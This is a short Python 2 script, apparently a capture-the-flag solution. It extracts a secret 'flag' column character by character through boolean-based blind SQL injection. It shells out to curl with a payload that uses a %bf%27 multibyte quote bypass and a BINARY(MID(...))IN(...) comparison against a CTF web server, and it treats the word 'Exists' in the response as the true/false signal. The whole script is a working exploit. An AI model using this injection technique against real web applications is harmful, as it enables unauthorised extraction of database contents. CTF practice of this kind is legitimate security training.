import requests
import binascii
import os

flag = ''
counter = 1
while True:
	for i in range (33,127):
		char = str(hex(i))
		a = os.popen('curl --data username="%bf%27||BINARY(MID(flag,'+str(counter)+',1))IN('+char+');##" --silent -X POST http://ctf.pwn.sg:8180/index.php?search').read()
		if "Exists" in a:
			flag += chr(i) 
			counter += 1
			os.system('clear')
			print flag



